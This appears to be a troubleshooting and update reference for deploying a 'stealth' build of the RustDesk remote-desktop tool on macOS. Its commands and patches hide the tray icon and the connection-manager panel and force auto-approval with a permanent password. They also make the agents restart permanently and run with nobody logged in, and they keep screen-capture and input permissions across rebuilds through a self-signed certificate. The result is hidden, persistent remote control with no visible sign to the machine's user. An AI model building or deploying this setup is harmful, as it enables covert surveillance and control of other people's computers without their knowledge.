# Recovery, updates, and troubleshooting

Reference for `deploy-stealth-rustdesk` — reached from the main steps when a build fails, on a version bump, or to uninstall.

## Rollback / uninstall

```bash
sudo launchctl bootout system/com.carriez.RustDesk_service 2>/dev/null
launchctl bootout gui/$(id -u)/com.carriez.RustDesk_server 2>/dev/null
sudo rm -f /Library/LaunchDaemons/com.carriez.RustDesk_service.plist /Library/LaunchAgents/com.carriez.RustDesk_server.plist
sudo rm -rf /Applications/RustDesk.app
sudo rm -rf /var/root/Library/Preferences/com.carriez.RustDesk ~/Library/Preferences/com.carriez.RustDesk   # wipes ID/password/config
# optional: revoke TCC grants
sudo tccutil reset ScreenCapture com.carriez.rustdesk; sudo tccutil reset Accessibility com.carriez.rustdesk; sudo tccutil reset ListenEvent com.carriez.rustdesk
```

## Updating to a newer RustDesk

Do **not** run the official installer — it loses stealth and re-introduces the daemon trap. Instead:

1. **Re-derive the pins** for the new tag (they drift release to release):
   - Rust (macOS), Flutter, vcpkg commit, FLUTTER_RUST_BRIDGE_VERSION, CARGO_EXPAND_VERSION, vcpkg triplet → `.github/workflows/flutter-build.yml` and `bridge.yml` (env block) of that tag.
   - `flutter_rust_bridge` version → `Cargo.toml` (must match the codegen version).
   - Build feature flags → the macOS `build.py` line in `flutter-build.yml` (was `--flutter --hwcodec --unix-file-copy-paste`).
2. Clone the new tag, `git apply assets/stealth.patch`. If it fails to apply, the upstream code moved — re-locate the two sites by hand:
   - tray: `src/tray.rs`, the `Event::NewEvents(StartCause::Init)` handler in `make_tray()`, the `OPTION_HIDE_TRAY == "Y"` early-return.
   - CM gate: `src/ipc.rs`, the `get_config` handler's `name == "hide_cm"` arm; drop the `is_pro() || is_custom_client()` condition.
3. Run Steps 3–9 as normal. **Two fixes live OUTSIDE `stealth.patch` and must be re-applied every fresh clone** (both are baked into the steps): the window_manager Dock patch (Step 3, `sed` on the pub-cache copy after `pub get`) and the agent `KeepAlive=true` fix (Step 6, PlistBuddy on the installed plist). If the window_manager `sed` no-ops on a new ref, hand-edit `WindowManager.swift`'s `setSkipTaskbar` to always `setActivationPolicy(.accessory)`.
4. **Permissions will re-prompt** — a rebuild changes the ad-hoc cdhash, so macOS treats it as a new app and drops the old TCC grants. Re-grant the three (Step 8). To avoid this across future rebuilds, sign with a stable self-signed code-signing identity instead of ad-hoc (`codesign -s "<cert-name>"`); TCC then keys on the cert, not the cdhash.

## Build failures

- **`file not found for module bridge_generated` / `EventToUI: IntoIntoDart`** — Step 3 (FRB codegen) was skipped or failed. Confirm `src/bridge_generated.rs` exists; if not, re-run codegen. `build.py` never runs it for you.
- **vcpkg link errors / missing codec** — wrong triplet or the manifest install didn't finish. Confirm `$VCPKG_ROOT/installed/arm64-osx/lib` has `libvpx.a libyuv.a libaom.a libopus.a` (and `libavcodec.a` for `--hwcodec`). Re-run `vcpkg install --triplet arm64-osx --x-install-root="$VCPKG_ROOT/installed"` from the repo.
- **`xcodebuild requires Xcode`** — CLT is active, not full Xcode. `sudo xcode-select -s /Applications/Xcode.app/Contents/Developer`.
- **Flutter/pod errors** — wrong Flutter version. Must be the pinned one (3.24.5 for 1.4.8), not `brew`'s latest. `flutter --version` to check.

## Connection / stealth failures

- **Keyboard dead, mouse works** — the **daemon trap**: the controlling process is a LaunchDaemon (outside the user session), not the LaunchAgent. Confirm `RustDesk --server` runs in the GUI session (`launchctl print gui/$(id -u)/com.carriez.RustDesk_server` → running) and that you did **not** build with `hide-tray=Y`. The tray patch (not that flag) is what hides the icon.
- **CM panel still pops out** — either the `ipc.rs` hunk isn't in the running binary (rebuild + redeploy), or the three Step 7 options aren't all set in the config the running process reads. Verify: `grep -c 'STEALTH BUILD PATCH' /Applications/RustDesk.app/…`? — no, the binary is compiled; instead confirm the source had both hunks before the build, and that `approve-mode`/`verification-method`/`allow-hide-cm` are present in **both** `~/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml` and the `/var/root/...` copy.
- **`Connected, waiting for image` after a rebuild/re-sign** — the new binary's ad-hoc cdhash no longer matches the `csreq` bound to the old TCC grant, so macOS silently denies screen capture even though the row still reads `auth_value=2` (ALLOWED). Checking the row is misleading; it looks granted. Fix: `sudo tccutil reset ScreenCapture com.carriez.rustdesk` (also `Accessibility`, `ListenEvent`), restart both services, re-grant. To stop this recurring on every update, sign with a **stable self-signed code-signing identity** (`codesign -s "<cert>"`) instead of ad-hoc — TCC then binds to the cert, not the cdhash, and grants survive rebuilds.
- **Remote access works only while a RustDesk window is open / agent won't stay up** — the stock agent `KeepAlive` restarts only on an *unsuccessful* exit (`SuccessfulExit=false`), so a clean exit (e.g. closing a GUI window ends the `--server`) leaves it down, and with no user-session agent a connection can't capture or inject. Permanent fix (Step 6): force always-restart — `sudo /usr/libexec/PlistBuddy -c "Delete :KeepAlive" -c "Add :KeepAlive bool true" /Library/LaunchAgents/com.carriez.RustDesk_server.plist` then re-bootstrap the agent. To just bring it up now: `launchctl kickstart -k gui/$(id -u)/com.carriez.RustDesk_server`. The root daemon (`service`) has plain `KeepAlive=true` already.
- **CM panel returns after the password step** — RustDesk reset `verification-method` to `use-both-passwords` because the service started "permanent-only but with no valid permanent password" (usually the `--password` step raced the IPC socket and printed `Connection refused` instead of `Done!`). `hide_cm()` then reads false. Fix: confirm the permanent password is set (retry `--password` until `Done!`), then `sed -i '' "s/^verification-method = .*/verification-method = 'use-permanent-password'/"` both `RustDesk2.toml` and restart. It sticks once a valid permanent password exists.
- **Can't connect at all after reboot** — check both launchctl labels are loaded (`state = running`); the daemon has `RunAtLoad`+`KeepAlive` and the agent loads in the `LoginWindow` session, so it should come up with nobody logged in.
- **ID or password rejected** — daemon (root) and agent (user) configs drifted (different `enc_id`/key). Re-sync (Step 7, part 3) so both `RustDesk.toml` files are identical, then restart both services.

## Redeploying a rebuilt app over a running install

```bash
launchctl bootout gui/$(id -u)/com.carriez.RustDesk_server; sudo launchctl bootout system/com.carriez.RustDesk_service
sudo rm -rf /Applications/RustDesk.app && sudo cp -R "$APP" /Applications/RustDesk.app && sudo chown -R root:wheel /Applications/RustDesk.app
sudo codesign --force --deep --sign - /Applications/RustDesk.app   # sudo: bundle is now root-owned; without it, nested dylibs fail to sign
sudo launchctl load -w /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
launchctl bootstrap gui/$(id -u) /Library/LaunchAgents/com.carriez.RustDesk_server.plist
```
Config (ID, password, options) persists across a redeploy; only the binary changes.

## Stable signing identity (stop re-granting on every update)

Ad-hoc (`-s -`) binds TCC grants to the exact binary, so each rebuild breaks them. A self-signed code-signing cert binds grants to the **cert** instead, so rebuilds keep their permissions. One-time setup (Keychain Access is the reliable route — creating a codesigning cert non-interactively is fiddly):

1. Keychain Access ▸ **Certificate Assistant ▸ Create a Certificate…** → Name e.g. `RustDeskStealth`, Identity Type **Self-Signed Root**, Certificate Type **Code Signing** → Create.
2. Confirm it is usable: `security find-identity -v -p codesigning` lists `RustDeskStealth`.
3. Sign with it wherever ad-hoc was used (Step 5 and the redeploy above): `codesign --force --deep --sign "RustDeskStealth" "$APP"` (`sudo` for the installed root-owned copy).
4. Grant the three permissions once against this identity. Every later rebuild signed with the same cert keeps them — no reset, no re-grant.

The cert need not be trusted for Gatekeeper; codesign only needs the identity present in the keychain, and TCC keys on the cert in the app's designated requirement.
